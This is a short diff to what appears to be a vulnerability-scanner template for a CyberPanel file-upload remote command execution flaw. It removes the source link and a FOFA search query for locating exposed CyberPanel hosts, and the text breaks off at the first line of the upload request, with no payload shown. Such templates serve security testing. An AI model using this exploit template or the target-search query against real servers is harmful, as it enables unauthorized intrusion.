@@ -3,12 +3,8 @@ info:
   name: Cyber​​Panel upload 远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xga7wme60zoi0osi'
+  description: ''
   tags: rce,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xga7wme60zoi0osi
-    fofa: app="CyberPanel"
 http:
 - raw:
   - 'POST /filemanager/upload HTTP/1.1
